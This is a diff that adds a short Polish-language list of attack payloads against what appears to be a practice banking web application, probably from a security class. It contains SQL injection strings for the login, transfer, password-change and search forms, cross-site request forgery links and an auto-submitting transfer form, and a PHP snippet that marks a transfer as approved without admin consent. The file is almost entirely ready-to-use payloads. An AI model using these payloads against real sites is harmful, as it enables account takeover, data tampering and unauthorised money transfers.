@@ -1,0 +1,34 @@
+SQL
+W logowaniu, jako login: "qwer';#" lub "a' or id = 12;#"
+W przelewie, w NRB odbiorcy: "qwer', 1231, '11111111111111111111111111111111', 1, NOW());#"
+W zmianie has³a: "haslo') where login = 'qwer';#"
+W wyszukiwaniu transakcji: "qwer' or uzytkownik_id = 18;#", "qwer' or status = 0;#"
+
+XSRF
+<a href="index.php?akcja=nowy_przelew_get&nrb=303030&kwota=30003">Kliknij</a>
+<a href="index.php?id=52&akcja=przelew_zatwierdzony_admin">Kliknij</a>
+
+<body onload="document.forms[0].submit()">
+<form action="index.php?akcja=nowy_przelew_oczekiwanie" method="POST">
+<input type="hidden" name="nrb" value="30303030"/>
+<input type="hidden" name="kwota" value="100000"/>
+<input type="submit" name="wyslij" value="Kliknij"/>
+</form>
+
+XSS
+------------
+<?php
+die();
+?>
+
+
+<script><?php
+$conn = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
+if ($conn->connect_error) {
+    die("Connection failed: " . $conn->connect_error);
+}
+    $sql = "update przelew set status = 1 where id = 39";
+    $conn->query($sql) or die(mysqli_error($conn));
+    $conn->close();
+    $_SESSION["komunikat"] = "zatwierdzono przelew (bez zgody admina)";
+?></script>
